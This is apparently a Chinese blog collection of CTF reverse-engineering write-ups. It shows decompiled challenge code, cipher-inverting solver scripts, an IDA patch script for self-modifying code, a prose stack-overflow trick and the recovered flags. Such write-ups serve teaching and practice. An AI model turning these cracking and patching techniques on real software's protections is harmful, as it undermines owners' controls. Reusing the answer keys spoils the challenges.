v11[1] = 0LL; v11[2] = 0LL; v12 = 0; v13[0] = 0LL; v13[1] = 0LL; v13[2] = 0LL; v14 = 0; v15[0] = 0LL; v15[1] = 0LL; v15[2] = 0LL; v15[3] = 0LL; v15[4] = 0LL; v15[5] = 0LL; v16 = 0; strcpy( v17, &quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;); v9[0] = 0LL; v9[1] = 0LL; v10 = 0; v7 = &amp;v17[22]; strcpy(v8, &quot;sctf_9102&quot;); puts((const char *)(unsigned int)&quot;plz tell me the shortest password1:&quot;); scanf(&quot;%s&quot;, v15); v6 = 1; while ( v6 ) { v4 = *((_BYTE *)v15 + v5); switch ( v4 ) { case 'w': v7 -= 5; break; case 's': v7 += 5; break; case 'd': ++v7; break; case 'a': --v7; break; case 'x': v7 += 25; break; case 'y': v7 -= 25; break; default: v6 = 0; break; } ++v5; if ( *v7 != 46 &amp;&amp; *v7 != 35 ) v6 = 0; if ( *v7 == 35 ) { puts(&quot;good!you find the right way!\\nBut there is another challenge!&quot;); break; } } if ( v6 ) { puts((const char *)(unsigned int)&quot;plz tell me the password2:&quot;); scanf(&quot;%s&quot;, v11); ((void (__fastcall *)(__int64 *, __int64 *))loc_C22)(v11, v13); if ( (unsigned int)sub_F67(v13, v8) == 1 ) { puts(&quot;Congratulation!&quot;); puts((const char *)(unsigned int)&quot;Now,this is the last!&quot;); puts(&quot;plz tell me the password3:&quot;); scanf(&quot;%s&quot;, v9); if ( (unsigned int)sub_FFA(v9) == 1 ) { puts(&quot;Congratulation!Here is your flag!:&quot;); printf(&quot;sctf{%s-%s(%s)}&quot;, (const char *)v15, (const char *)v11, (const char *)v9); } else { printf(&quot;something srong...&quot;); } result = 0LL; } else { printf(&quot;sorry,somthing wrong...&quot;); result = 0LL; } } else { printf(&quot;sorry,is't not a right way...&quot;); result = 0LL; } return result;} 观察代码，大概是一个5*25的迷宫题,wasd分别为上下左右，还有xy为向上或向下跳5行，起点位于s处 第一个循环的路大概是sxss 接下来还有Password2，继续分析，进到loc_c22中查看 按p声明函数，控制台发现地址e1c处有未识别的数据： 按c转换为代码 然后在各种标红的地方还有一些奇怪的跳转处nop掉指令，最终成功能f5 然后第二部分是一个base64的解码 password2为c2N0Zl85MTAy 然后进到password3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990__int64 __fastcall sub_FFA(char *input3){ int v2; // [rsp+18h] [rbp-158h] int i; // [rsp+18h] [rbp-158h] int v4; // [rsp+1Ch] [rbp-154h] int v5; // [rsp+24h] [rbp-14Ch] int v6; // [rsp+28h] [rbp-148h] int v7; // [rsp+2Ch] [rbp-144h] int v8[16]; // [rsp+30h] [rbp-140h] int v9[16]; // [rsp+70h] [rbp-100h] int v10[26]; // [rsp+B0h] [rbp-C0h] unsigned int v11; // [rsp+118h] [rbp-58h] unsigned int v12; // [rsp+11Ch] [rbp-54h] unsigned int v13; // [rsp+120h] [rbp-50h] unsigned int v14; // [rsp+124h] [rbp-4Ch] unsigned __int64 v15; // [rsp+168h] [rbp-8h] v15 = __readfsqword(0x28u); v8[0] = 190; v8[1] = 4; v8[2] = 6; v8[3] = 128; v8[4] = 197; v8[5] = 175; v8[6] = 118; v8[7] = 71; v8[8] = 159; v8[9] = 204; v8[10] = 64; v8[11] = 31; v8[12] = 216; v8[13] = 191; v8[14] = 146; v8[15] = 239; v5 = (input3[6] &lt;&lt; 8) | (input3[5] &lt;&lt; 16) | (input3[4] &lt;&lt; 24) | input3[7]; v6 = (input3[10] &lt;&lt; 8) | (input3[9] &lt;&lt; 16) | (input3[8] &lt;&lt; 24) | input3[11]; v7 = (input3[14] &lt;&lt; 8) | (input3[13] &lt;&lt; 16) | (input3[12] &lt;&lt; 24) | input3[15]; v4 = 0; v2 = 4; v10[0] = sub_78A((input3[2] &lt;&lt; 8) | (input3[1] &lt;&lt; 16) | (*input3 &lt;&lt; 24) | (unsigned int)input3[3]); v10[1] = sub_78A(v5); v10[2] = sub_78A(v6); v10[3] = sub_78A(v7); do { v10[v2] = sub_143B(v10[v4], v10[v4 + 1], v10[v4 + 2], v10[v4 + 3]); ++v4; ++v2; } while ( v2 &lt;= 29 ); v9[0] = HIBYTE(v11); v9[1] = BYTE2(v11); v9[2] = BYTE1(v11); v9[3] = (unsigned __int8)v11; v9[4] = HIBYTE(v12); v9[5] = BYTE2(v12); v9[6] = BYTE1(v12); v9[7] = (unsigned __int8)v12; v9[8] = HIBYTE(v13); v9[9] = BYTE2(v13); v9[10] = BYTE1(v13); v9[11] = (unsigned __int8)v13; v9[12] = HIBYTE(v14); v9[13] = BYTE2(v14); v9[14] = BYTE1(v14); v9[15] = (unsigned __int8)v14; for ( i = 0; i &lt;= 15; ++i ) { if ( v9[i] != v8[i] ) return 0xFFFFFFFFLL; } return 1LL;}__int64 __fastcall sub_143B(int a1, int a2, int a3, unsigned int a4){ return a1 ^ (unsigned int)sub_1464(a2 ^ a3 ^ a4);}__int64 __fastcall sub_1464(unsigned int a1){ int v2; // [rsp+18h] [rbp-498h] int v3[290]; // [rsp+20h] [rbp-490h] BYREF unsigned __int64 v4; // [rsp+4A8h] [rbp-8h] v4 = __readfsqword(0x28u); qmemcpy(v3, &amp;unk_1940, 0x480uLL); v2 = (v3[BYTE2(a1)] &lt;&lt; 16) | v3[(unsigned __int8)a1] | (v3[BYTE1(a1)] &lt;&lt; 8) | (v3[HIBYTE(a1)] &lt;&lt; 24); return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);} 对加密算法进行逆向： 1234567891011121314151617181920212223242526272829303132from libnum import n2sf=open('55','rb')table=[]for i in range(68): line=f.read(16) for j in range(len(line)): if j%4==0: table.append(line[j])for i in range(0,len(table),4): print(hex(table[i]),hex(table[i+1]),hex(table[i+2]),hex(table[i+3]))def sub_143b(a1,a2,a3,a4): return a1^sub_1464(a2^a3^a4)def sub_1464(a1): v2=(table[a1&gt;&gt;24]&lt;&lt;24)|(table[(a1&gt;&gt;16)&amp;0xff]&lt;&lt;16)|(table[(a1&gt;&gt;8)&amp;0xff]&lt;&lt;8)|(table[a1&amp;0xff]) return rol(v2,12)^rol(v2,8)^ror(v2,2)^ror(v2,6)def rol(a1,s): return ((a1&lt;&lt;s)|(a1&gt;&gt;(32-s)))&amp;0xffffffffdef ror(a1,s): return ((a1&gt;&gt;s)|(a1&lt;&lt;(32-s)))&amp;0xffffffffa = [0]*26a.append(0xBE040680)a.append(0xC5AF7647)a.append(0x9FCC401F)a.append(0xD8BF92EF)for i in range(25,-1,-1): a[i] = sub_143b(a[i+4],a[i+1],a[i+2],a[i+3])print(n2s(a[0])[::-1]+n2s(a[1])[::-1]+n2s(a[2])[::-1]+n2s(a[3])[::-1]) 最终得到flag:sctf{sxss-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)} [2019红帽杯]Snake（不看dl的wp完全不会系列，就连wp也跟dl一样系列） 下载附件，解压发现是个有Unity写的游戏 找到Assembly-CSharp.dll文件，拖进dnspy，找到游戏主函数GameObject 发现这个函数是在Interface中，就到文件中找Interface.dll，把它拖进ida 找到关键词，点进去，ctrl+s交叉引用定位关键代码 发现一串又臭又长的代码，观察题目的参数a1范围为[0,99]，便进行爆破 123456789101112import ctypesdef fxxk(i): dll = ctypes.cdll.LoadLibrary(&quot;C:\\\\Users\\\\80424\\\\Downloads\\\\attachment\\\\Snake\\\\Snake_Data\\\\Plugins\\\\Interface.dll&quot;) print(i) dll.GameObject(i) if __name__ == '__main__': for i in range(100): fxxk(i) 在漫长的等待后，得到flag:flag{Ch4rp_W1th_R$@} [FlareOn2]very_success拖进ida开始分析 关键在sub_401084中，点进去查看 12345678910111213141516171819202122232425262728293031323334353637383940414243int __usercall sub_401084@&lt;eax&gt;(int result@&lt;eax&gt;, int a2, char *input, int a4){ __int16 v4; // bx int v5; // ecx _BYTE *v7; // edi char v8; // al unsigned int v9; // kr00_4 char v10; // al char v11; // cf __int16 v12; // ax bool v13; // zf _BYTE *v14; // edi int v15; // [esp+0h] [ebp-Ch] v4 = 0; v5 = 37; if ( a4 &gt;= 37 ) { v7 = (_BYTE *)(a2 + 36); while ( 1 ) { LOWORD(result) = 455; v15 = result; v8 = *input++; v9 = __readeflags(); v10 = v15 ^ v8; __writeeflags(v9); v12 = (unsigned __int8)(__ROL1__(1, v4 &amp; 3) + v11 + v10);//加密 v4 += v12; v13 = *v7 == (unsigned __int8)v12; //此行进行对比 v14 = v7 + 1; if ( !v13 ) // v13需要=1 LOWORD(v5) = 0; result = v15; if ( !v5 ) break; v7 = v14 - 2; if ( !--v5 ) return result; } } return 0;}//为便于阅读，代码有改动 可以发现加密流程就是将输入的字符与一个常数result异或后，与常数v11和1&lt;&lt;(v4&amp;3)相加，每一次循环后v4便加上v12的值 通过v12和v7的值的对比可以判断flag是否正确，因此关键在于得到v7的值 动调得到v7中的值： 接着通过动调发现v11的值在加密时始终为1（这点比较诡异，在未加密是v11的值会在0、1间反复横跳） 最终写出解题脚本： 123456789101112131415161718def rol(a,b): return (a&lt;&lt;b)|(a&gt;&gt;(8-b))&amp;0xffa=[0xAA ,0xEC ,0xA4 ,0xBA ,0xAF ,0xAE ,0xAA,0x8A ,0xC0 ,0xA7 ,0xB0 ,0xBC ,0x9A ,0xBA ,0xA5 ,0xA5 ,0xBA ,0xAF ,0xB8 ,0x9D ,0xB8 ,0xF9 ,0xAE,0x9D ,0xAB ,0xB4 ,0xBC ,0xB6 ,0xB3 ,0x90 ,0x9A ,0xA8 ]a=a[::-1]v4=0v11=0flag=[]for i in a: v10=(i-rol(1,v4&amp;3)-1)%256 v4+=i flag.append(v10^0x1901c7%256)str=''for i in flag: str+=chr(i)print(str)#a_Little_b1t_harder_plez@flare-o 结合题目提示，得到flag:flag{a_Little_b1t_harder_plez@flare-on.com} [CISCN2018]2ex拖进ida,shift+f12看字符串 结合out.txt内容： 1│_r-+_Cl5;vgq_pdme7#7eC0= 有理由怀疑这是base64变种 继续跟踪，发现这个函数，显然是base64的编码 码表为 尝试将out.txt中内容根据码表内容进行解码，得到flag:flag{change53233} [SCTF2019]Who is he下载压缩包，发现是unity游戏，打开运行一下 发现是一段鬼畜视频，挺带感的 把Assembly-CSharp.dll拖进dnSpy中，找到OnClick()函数，发现是将输入的数据与解密后的已加密的flag进行对比从而判断正确 12345678910111213141516public void OnClick(){ Debug.Log(&quot;Button Clicked. TestClick.&quot;); Debug.Log(this.Name.text); bool flag = this.Name.text.Equals(this.Decrypt(this.EncryptData)); if (flag) { Debug.Log(&quot;Right&quot;); TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Haha, same as you!&quot;, &quot;Info:&quot;, 0); } else { Debug.Log(&quot;Wrong&quot;); TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Emmmmm,I don't think so.&quot;, &quot;Info:&quot;, 0); }} 查看解密函数 123456789101112131415161718192021222324private string Decrypt(string str){ string result; try { byte[] bytes = Encoding.Unicode.GetBytes(TestClick.encryptKey); byte[] array = Convert.FromBase64String(str); DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write); cryptoStream.Write(array, 0, array.Length); cryptoStream.FlushFinalBlock(); byte[] bytes2 = memoryStream.ToArray(); cryptoStream.Close(); memoryStream.Close(); result = Encoding.Unicode.GetString(bytes2); } catch { result = str; } return result;} 只是将flag在base64解码后，使用了DES进行解密，注意使用的是CBC模式 查看EncryptData和encruptKey，得到密文为 11Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA== 密钥为1234 注意，在C#中，字符串默认是Unicode字符串，所以转成字节数组，在每个字符字节后都要加一个”\\x00” 进行解密： 12345678import base64from Crypto.Cipher import DESkey = b&quot;1\\x002\\x003\\x004\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到He_P1ay_Basketball_Very_We11!Hahahahaha!ࠈࠈࠈࠈ 然而提交并不是flag，查看大佬的wp后才发现密文和密钥被更换了 用Cheat Engine搜索字符串“Emmmm”，发现有两处 跟进其中一处看，发现有新的base64字符串，可能是真正的密文 进行解密 12345678910import base64from Crypto.Cipher import DESkey = b&quot;t\\x00e\\x00s\\x00t\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher = b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;#cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到flag:flag{She_P1ay_Black_Hole_Very_Wel1!LOL!XD!} [SUSCTF 2022]DigitalCircuits下载附件，发现是python逆向 使用pyinstxtractor处理，得到pyc文件，在扔进在线网站得到代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport timedef f1(a, b):#&amp; if a == '1' and b == '1': return '1' return Nonedef f2(a, b):# | if a == '0' and b == '0': return '0' return Nonedef f3(a):# ! if a == '1': return '0' if None == '0': return '1'def f4(a, b):#^ return f2(f1(a, f3(b)), f1(f3(a), b))def f5(x, y, z): s = f4(f4(x, y), z)#s=x^y^z c = f2(f1(x, y), f1(z, f2(x, y)))#c=(x&amp;y)|(z&amp;(x|y)) return (s, c)def f6(a, b): ans = '' z = '0' a = a[::-1] b = b[::-1] for i in range(32): ans += f5(a[i], b[i], z)[0] z = f5(a[i], b[i], z)[1] return ans[::-1]def f7(a, n):#左移n位，右边补0 return a[n:] + '0' * ndef f8(a, n): return n * '0' + a[:-n]#右移n位，左边补0def f9(a, b):#a^b(32位) ans = '' for i in range(32): ans += f4(a[i], b[i]) return ansdef f10(v0, v1, k0, k1, k2, k3): s = '00000000000000000000000000000000' d = '10011110001101110111100110111001' for i in range(32): s = f6(s, d) v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))#f6(v0,f6(v1&lt;&lt;4, k0)^ f6(v1, s)^ f6(v1&gt;&gt;5, k1)) v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))#f6(v1,f6(v0&lt;&lt;4, k2)^ f6(v0, s)^ f6(v0&gt;&gt;5, k3)) return v0 + v1k0 = '0100010001000101'.zfill(32)k1 = '0100000101000100'.zfill(32)k2 = '0100001001000101'.zfill(32)k3 = '0100010101000110'.zfill(32)flag = input('please input flag:')if flag[0:7] != 'SUSCTF{' or flag[-1] != '}': print('Error!!!The formate of flag is SUSCTF{XXX}') time.sleep(5) exit(0)flagstr = flag[7:-1]if len(flagstr) != 24: print('Error!!!The length of flag 24') time.sleep(5) exit(0)res = ''for i in range(0, len(flagstr), 8): v0 = flagstr[i:i + 4] v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8) v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8) res += f10(v0, v1, k0, k1, k2, k3)if res == '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111': print('True')else: print('False')print(res) 阅读代码，发现是加密算法，只不过是用字符串操作代替了位运算（函数f1和f2的代码有点问题，None应该是’0’或’1’）。 加密过程大致如下： 加密三轮，每轮加密8个字节，通过函数f10、f6、f5进行加密，因此主要思想是已知函数结果和输入参数b，对另一个输入参数a进行逆向 对f10的逆向：f10中含有两个状态变量s和d，仔细观察可以发现他们在每一轮的值都是相同的，与输入无关，因此可提前知道它们在每一轮的值。 f10的输出值为v0+v1，即res中的值，因此最后一轮的v0与v1已知 再观察该代码： 1v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3))) 输出v1已知，f6中另一个输入参数为 1f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)) #f6(v0&lt;&lt;4, k2)^ f6(v0, s)^ f6(v0&gt;&gt;5, k3) 此处v0为res中的值，而k2和k3的值不变，因此该参数的值也可以知道，那么问题就是对函数f6进行逆向了 编写解题脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from libnum import n2scip='001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'print(len(cip))def f7(a, n):#左移n位，右边补0 return a[n:] + '0' * ndef f8(a, n): return n * '0' + a[:-n]#右移n位，左边补0def f9(a, b):#a^b(32位) ans = '' for i in range(32): ans += f4(a[i], b[i]) return ansdef f1(a, b):#&amp; if a == '1' and b == '1': return '1' return '0'def f2(a, b):# | if a == '0' and b == '0': return '0' return '1'def f3(a):# ! if a == '1': return '0' if a == '0': return '1'def f4(a, b):#^ return f2(f1(a, f3(b)), f1(f3(a), b))def f5(x, y, z): s = f4(f4(x, y), z)#s=x^y^z c = f2(f1(x, y), f1(z, f2(x, y)))#c=(x&amp;y)|(z&amp;(x|y)) return (s, c)def f6(a, b): ans = '' z = '0' a = a[::-1] b = b[::-1] for i in range(32): ans += f5(a[i], b[i], z)[0] z = f5(a[i], b[i], z)[1] return ans[::-1]s_ =['00000000000000000000000000000000']d_ ='10011110001101110111100110111001'for i in range(32): s_.append(f6(s_[i],d_)) # print(s_[i])k0 = '0100010001000101'.zfill(32)k1 = '0100000101000100'.zfill(32)k2 = '0100001001000101'.zfill(32)k3 = '0100010101000110'.zfill(32)def inv_f10(res): v0=res[:32] v1=res[32:] for i in range(32): v1=inv_f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s_[32-i])), f6(f8(v0, 5), k3))) v0=inv_f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s_[32-i])), f6(f8(v1, 5), k1))) return v0,v1def inv_f6(ans,b): ans=ans[::-1] b=b[::-1] a='' z='0' for i in range(32): a+=f5(ans[i],b[i],z)[0] z=f5(a[i], b[i], z)[1] return a[::-1]def main(): flag='' for i in range(3): res_=cip[i*(len(cip)//3):(i+1)*(len(cip)//3)] v0,v1=inv_f10(res_) flag+=v0 flag+=v1 return int(flag,2)print(n2s(main())) [羊城杯 2020]Bytecode下载附件，发现是python字节码，于是手撸字节码： 利用python中的dis库可以有效地将python代码转换为对应的字节码，如： 12345678910111213141516171819202122232425import disdef func(): a=1 b=2 c=a+b print(c)dis.dis(func)''' 3 0 LOAD_CONST 1 (1) 2 STORE_FAST 0 (a) 4 4 LOAD_CONST 2 (2) 6 STORE_FAST 1 (b) 5 8 LOAD_FAST 0 (a) 10 LOAD_FAST 1 (b) 12 BINARY_ADD 14 STORE_FAST 2 (c) 6 16 LOAD_GLOBAL 0 (print) 18 LOAD_FAST 2 (c) 20 CALL_FUNCTION 1 22 POP_TOP 24 LOAD_CONST 0 (None) 26 RETURN_VALUE''' 个人感觉这篇博客讲的不错：Python逆向（五）—— Python字节码解读 - Blili - 博客园 (cnblogs.com) 一路边看边写，大致写出题目的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import disdef test(): en=[3,37,72,9,6,132] output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60, 106,51,101,178,189,101,48] print('welcome to GWHT2020') flag=input('please input your flag:') str=flag a=len(str) if a&lt;38: if((((ord(str[0])*2020+ord(str[1]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])==1182843538814603): print(b'good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') x=[] k=5 for i in range(13): b=ord(str[k]) c=ord(str[k+1]) a11=en[i%6]^c a22=en[i%6]^b x.append(a11) x.append(a22) k=k+2 if x==output: print(b'good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') l=len(str) a1=ord(str[l-7]) a2=ord(str[l-6]) a3=ord(str[l-5]) a4=ord(str[l-4]) a5=ord(str[l-3]) a6=ord(str[l-2]) if(a1*3+a2*2+a3*5==1003): if(a1*4+a2*7+a3*9==2013): if(a2*8+a1+a3*2==1109): if(a4*3+a5*2+a6*5==671): if(a4*4+a5*7+a6*9==1252): if(a5*8+a4+a6*2==644): print('congraduation!you get the right flag!') else: print('oh,you are wrong!') exit() else: print('bye') exit() exit()print(dis.dis(test)) 其实也就是将一部分输入和设置好的数组异或，最后再将部分输入放入方程中验证 写出解题脚本： 12345678910111213141516171819202122232425from sympy import *a1=Symbol('a1')a2=Symbol('a2')a3=Symbol('a3')print(solve([a1*3+a2*2+a3*5-1003,a1*4+a2*7+a3*9-2013,a2*8+a1+a3*2-1109],[a1,a2,a3]))#97 101 102a4=Symbol('a4')a5=Symbol('a5')a6=Symbol('a6')print(solve([a4*3+a5*2+a6*5-671,a4*4+a5*7+a6*9-1252,a5*8+a4+a6*2-644],[a4,a5,a6]))#102 55 51flag=chr(97)+chr(101)+chr(102)+chr(102)+chr(55)+chr(51)print(flag)output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60, 106,51,101,178,189,101,48]en=[3,37,72,9,6,132]k=0str=''for i in range(13): str+=chr(en[i%6]^output[k+1]) str+=chr(en[i%6]^output[k]) k+=2print(str)# cfa2b87b3f746a8f0ac5c5963fprint(chr(1182843538814603-(((ord('G')*2020+ord('W'))*2020+ord('H'))*2020+ord('T'))*2020)) 得到flag{cfa2b87b3f746a8f0ac5c5963faeff73} 摸鱼摸鱼，只有一题 [ACTF新生赛2020]Splendid_MineCraft一道smc类的题目 放进ida unk_4051DB为函数，相关内存经红框内代码修改 其中的strtok函数： 在此处下断点，开始动调 可以看到，运行过程中，代码在变化 读一下汇编可以发现，其实是将esi+0x1F~esi+0x1F+0x151这段代码进行异或 利用IDC(shift+f2)修改，附上IDC脚本 12345678910#include &lt;idc.idc&gt;static main(){ auto addr=0x4051DD+0x1F; auto i; for(i=0;i&lt;=0x151;i++){ PatchByte(addr+i,Byte(addr+i)^0x72); }} 得到比较漂亮的函数 这部分主要是将两个字符串异或然后加35，然后与输入的字符串作比较。 然后就可以获得第一段字符串：yOu0y* 第二部分打开OD动调，在0x00cb12ac处的jmp eax处下断点，开始运行 输入：ACTF{yOu0y*_123456_111111} 开始部分是将输入放到一段内存中 然后是将输入与0x83+i异或，并把结果作为数组下标来得到一定值 通过跟踪eax指向的地址，得到数组的值 将bl和cl比较，不相等的话则会失败，说明cl是最终加密得到的值 第二部分的结果也可以得到了： 1234567891011121314151617181920212223242526a=[ 0xF6,0xA3,0x5B,0x9D,0xE0,0x95,0x98,0x68,0x8C,0x65,0xBB,0x76,0x89,0xD4,0x09,0xFD, 0xF3,0x5C,0x3C,0x4C,0x36,0x8E,0x4D,0xC4,0x80,0x44,0xD6,0xA9,0x01,0x32,0x77,0x29, 0x90,0xBC,0xC0,0xA8,0xD8,0xF9,0xE1,0x1D,0xE4,0x67,0x7D,0x2A,0x2C,0x59,0x9E,0x3D, 0x7A,0x34,0x11,0x43,0x74,0xD1,0x62,0x60,0x02,0x4B,0xAE,0x99,0x57,0xC6,0x73,0xB0, 0x33,0x18,0x2B,0xFE,0xB9,0x85,0xB6,0xD9,0xDE,0x7B,0xCF,0x4F,0xB3,0xD5,0x08,0x7C, 0x0A,0x71,0x12,0x06,0x37,0xFF,0x7F,0xB7,0x46,0x42,0x25,0xC9,0xD0,0x50,0x52,0xCE, 0xBD,0x6C,0xE5,0x6F,0xA5,0x15,0xED,0x64,0xF0,0x23,0x35,0xE7,0x0C,0x61,0xA4,0xD7, 0x51,0x75,0x9A,0xF2,0x1E,0xEB,0x58,0xF1,0x94,0xC3,0x2F,0x56,0xF7,0xE6,0x86,0x47, 0xFB,0x83,0x5E,0xCC,0x21,0x4A,0x24,0x07,0x1C,0x8A,0x5A,0x17,0x1B,0xDA,0xEC,0x38, 0x0E,0x7E,0xB4,0x48,0x88,0xF4,0xB8,0x27,0x91,0x00,0x13,0x97,0xBE,0x53,0xC2,0xE8, 0xEA,0x1A,0xE9,0x2D,0x14,0x0B,0xBF,0xB5,0x40,0x79,0xD2,0x3E,0x19,0x5D,0xF8,0x69, 0x39 ,0x5F ,0xDB ,0xFA ,0xB2 ,0x8B ,0x6E ,0xA2 ,0xDF ,0x16 ,0xE2 ,0x63 ,0xB1 ,0x20 ,0xCB ,0xBA , 0xEE ,0x8D ,0xAA ,0xC8 ,0xC7 ,0xC5 ,0x05 ,0x66 ,0x6D ,0x3A ,0x45 ,0x72 ,0x0D ,0xCA ,0x84 ,0x4E , 0xF5 ,0x31 ,0x6B ,0x92 ,0xDC ,0xDD ,0x9C ,0x3F ,0x55 ,0x96 ,0xA1 ,0x9F ,0xCD ,0x9B ,0xE3 ,0xA0 , 0xA7 ,0xFC ,0xC1 ,0x78 ,0x10 ,0x2E ,0x82 ,0x8F ,0x30 ,0x54 ,0x04 ,0xAC ,0x41 ,0x93 ,0xD3 ,0x3B , 0xEF ,0x03 ,0x81 ,0x70 ,0xA6 ,0x1F ,0x22 ,0x26 ,0x28 ,0x6A ,0xAB ,0x87 ,0xAD ,0x49 ,0x0F ,0xAF ,]# print(hex(len(a)))result=[0x30,0x04,0x04,0x03,0x30,0x63]flag=''for i in range(len(result)): t=a.index(result[i]) t^=(0x83+i) flag+=chr(t)print(flag)#knowo3 第三部分则在程序流程图中可以找到 最终flag:ACTF{yOu0y*_knowo3_5mcsM&lt;} 参考：ACTF新生赛2020-Splendid_MineCraft - P.Z’s Blog (ppppz.net) [ACTF新生赛2020]Splendid_MineCraft 手把手带你跟汇编！_哔哩哔哩_bilibili 感觉这个up主，感觉讲得很详细，推荐！ 上大分 Dig the way一道逆向题，考的是栈溢出hhhh 先大概读一下程序流程，首先会打开文件data，但附件中并没有给出，然后根据文件大小将文件中字符读取到v7_20这个数组中（注意该数组长度只有20） 然后通过函数做了某些处理，符合要求后进入get_key函数，并产生对应flag 那么大致思路就是如何操作使得判断时v9=0，再来看看func_ptr中的三个函数 123456789signed int __cdecl func0(int a1, int a2, int a3){ int temp; // [esp+Ch] [ebp-4h] temp = *(_DWORD *)(4 * a2 + a1); *(_DWORD *)(a1 + 4 * a2) = *(_DWORD *)(4 * a3 + a1); *(_DWORD *)(a1 + 4 * a3) = temp; return 1;} 大概就是交换两个数的值 1234567unsigned int __cdecl func1(int basic_address, int a2, int a3){ return abs32(*(_DWORD *)(4 * a2 + basic_address) + *(_DWORD *)(4 * a3 + basic_address)) - abs32(*(_DWORD *)(4 * a3 + basic_address)) - abs32(*(_DWORD *)(4 * a2 + basic_address)) + 2;} 返回 $|x+y|-|x|-|y|+2$ 1234567unsigned int __cdecl func2(int a1, int a2, int a3){ return abs32(*(_DWORD *)(4 * a3 + a1)) - abs32(*(_DWORD *)(4 * a3 + a1) + *(_DWORD *)(4 * a2 + a1)) + abs32(*(_DWORD *)(4 * a2 + a1)) + 2;} 返回 $|x|+|y|-|x+y|+2$ 在第三轮时，v6=3，v8[v6]恰好就是v9，因此第三个函数的执行将决定了v9的值。 然而在func2中，由不等式$|x|+|y| \\geq |x+y| $可知，该函数最少也会返回2 那么如何解决该问题？思路是利用栈溢出修改函数运行顺序，让第三轮运行func1函数，并令参数一个为2，另一个为-1. 利用读取data文件的溢出漏洞，实现覆盖变量值，并据此写出data文件的内容 得到flag: 8cda1bdbb92900b9291bdb8cda [watevrCTF 2019]Repyc下载得到pyc文件，反编译得到一堆奇怪的代码 变量替换，弄好看点，发现其实是个vm题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationvalue_0 = 0v2 = 1v3 = 2def func1(par1): local1 = 0 local2 = 0 array_0 = [0] * 16 array2 = [0] * 100 local5 = [] while par1[local1][value_0] != 'finish': local6 = par1[local1][value_0] local7 = par1[local1][1:] if local6 == 'addition': array_0[local7[value_0]] = array_0[local7[1]] + array_0[local7[2]] elif local6 == '\\xeb\\xa0\\x80': array_0[local7[value_0]] = array_0[local7[1]] ^ array_0[local7[2]] elif local6 == '\\xeb\\xa0\\xb3': array_0[local7[value_0]] = array_0[local7[1]] - array_0[local7[2]] elif local6 == 'multiple': 